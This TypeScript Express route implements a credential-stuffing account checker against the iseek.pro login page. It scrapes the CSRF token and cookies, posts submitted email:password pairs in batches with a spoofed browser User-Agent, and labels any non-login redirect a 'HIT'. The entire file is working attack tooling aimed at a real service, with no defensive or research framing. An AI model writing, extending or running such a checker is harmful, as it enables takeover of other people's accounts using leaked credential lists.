import { Router, type IRouter } from "express";

const router: IRouter = Router();

// ── Constants ─────────────────────────────────────────────────────────────────
const LOGIN_URL  = "https://iseek.pro/login";
const TIMEOUT_MS = 15_000;

const BASE_HEADERS: Record<string, string> = {
  "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
};

// ── Types ─────────────────────────────────────────────────────────────────────
export type CheckStatus = "HIT" | "FAIL" | "ERROR";

export interface CheckResult {
  credential: string;
  email:      string;
  status:     CheckStatus;
  detail:     string;   // redirect URL on HIT, error message on ERROR, "back to login" on FAIL
}

// ── Cookie jar helper ────────────────────────────────────────────────────────
// fetch() doesn't auto-manage cookies. We collect Set-Cookie headers
// from the GET response and replay them in the POST.
function parseCookies(headers: Headers): string {
  const raw = headers.getSetCookie?.() ?? [];
  return raw.map(c => c.split(";")[0]).join("; ");
}

// ── Token extractor ──────────────────────────────────────────────────────────
function extractToken(html: string): string | null {
  // Strategy 1: <input name="_token" value="...">
  const m1 = html.match(/name=["']_token["']\s+value=["']([^"']+)["']/);
  if (m1) return m1[1];
  // Strategy 2: value="..." name="_token"
  const m2 = html.match(/value=["']([^"']+)["']\s+name=["']_token["']/);
  if (m2) return m2[1];
  // Strategy 3: _token anywhere near a 40-60 char alphanumeric value
  const m3 = html.match(/_token[^>]*value=["']([A-Za-z0-9+/=]{20,80})["']/);
  if (m3) return m3[1];
  return null;
}

// ── Core checker ─────────────────────────────────────────────────────────────
async function checkCredential(email: string, password: string): Promise<CheckResult> {
  const credential = `${email}:${password}`;
  const signal     = AbortSignal.timeout(TIMEOUT_MS);

  // ── Step 1: GET login page → grab CSRF token + session cookies ─────────────
  let getResp: Response;
  try {
    getResp = await fetch(LOGIN_URL, {
      method:   "GET",
      headers:  { ...BASE_HEADERS },
      redirect: "follow",
      signal,
    });
  } catch (e: unknown) {
    return { credential, email, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
  }

  const html      = await getResp.text().catch(() => "");
  const cookieJar = parseCookies(getResp.headers);
  const token     = extractToken(html);

  if (!token) {
    return { credential, email, status: "ERROR", detail: "NO_TOKEN_FOUND" };
  }

  // ── Step 2: POST credentials ───────────────────────────────────────────────
  const body = new URLSearchParams({
    _token:   token,
    email:    email,
    password: password,
  });

  const postHeaders: Record<string, string> = {
    ...BASE_HEADERS,
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer":      LOGIN_URL,
    "Origin":       "https://iseek.pro",
  };
  if (cookieJar) postHeaders["Cookie"] = cookieJar;

  let postResp: Response;
  try {
    // First try without following redirects to inspect location header
    postResp = await fetch(LOGIN_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "manual",
      signal:   AbortSignal.timeout(TIMEOUT_MS),
    });
  } catch (e: unknown) {
    return { credential, email, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
  }

  const status  = postResp.status;
  const isRedir = status >= 301 && status <= 308;

  if (isRedir) {
    const loc = postResp.headers.get("location") ?? "";
    // HIT = redirected somewhere other than /login
    if (loc && !loc.includes("/login")) {
      const detail = loc.startsWith("/") ? `https://iseek.pro${loc}` : loc;
      return { credential, email, status: "HIT", detail };
    }
    // Redirected back to login = wrong credentials
    return { credential, email, status: "FAIL", detail: loc || "redirect_to_login" };
  }

  // No redirect: follow and check final URL
  try {
    const final = await fetch(LOGIN_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "follow",
      signal:   AbortSignal.timeout(TIMEOUT_MS),
    });
    const finalUrl = final.url;
    if (finalUrl && !finalUrl.includes("/login")) {
      return { credential, email, status: "HIT", detail: finalUrl };
    }
    return { credential, email, status: "FAIL", detail: finalUrl || "no_redirect" };
  } catch (e: unknown) {
    return { credential, email, status: "ERROR", detail: `POST_FOLLOW_ERROR:${String(e)}` };
  }
}

// ── Validation helpers ────────────────────────────────────────────────────────
const MAX_BULK = 50; // max credentials per request to avoid abuse

function parseCredentials(raw: string): Array<{ email: string; password: string }> {
  return raw
    .split(/[\n,;]+/)
    .map(l => l.trim())
    .filter(Boolean)
    .slice(0, MAX_BULK)
    .map(line => {
      const colonIdx = line.indexOf(":");
      if (colonIdx === -1) return null;
      return { email: line.slice(0, colonIdx).trim(), password: line.slice(colonIdx + 1).trim() };
    })
    .filter((x): x is { email: string; password: string } => x !== null && x.email.length > 0 && x.password.length > 0);
}

// ── Routes ────────────────────────────────────────────────────────────────────
// POST /api/checker/check
// body: { credentials: string[] }   e.g. ["email:pass", ...]  max 50
// or   { email: string, password: string }  for single
router.post("/checker/check", async (req, res): Promise<void> => {
  const { credentials, email, password } = req.body as {
    credentials?: string[];
    email?: string;
    password?: string;
  };

  let pairs: Array<{ email: string; password: string }> = [];

  if (email && password) {
    pairs = [{ email: email.trim(), password: String(password).trim() }];
  } else if (Array.isArray(credentials)) {
    pairs = parseCredentials(credentials.join("\n"));
  } else {
    res.status(400).json({ error: "Provide { credentials: string[] } or { email, password }" });
    return;
  }

  if (pairs.length === 0) {
    res.status(400).json({ error: "No valid credentials provided" });
    return;
  }

  // Sequential checks with small delay to avoid hammering the target
  const results: CheckResult[] = [];
  for (const pair of pairs) {
    const r = await checkCredential(pair.email, pair.password);
    results.push(r);
    if (pairs.length > 1) await new Promise(ok => setTimeout(ok, 1500));
  }

  const hits  = results.filter(r => r.status === "HIT").length;
  const fails = results.filter(r => r.status === "FAIL").length;
  const errs  = results.filter(r => r.status === "ERROR").length;

  res.json({ total: results.length, hits, fails, errors: errs, results });
});

export default router;
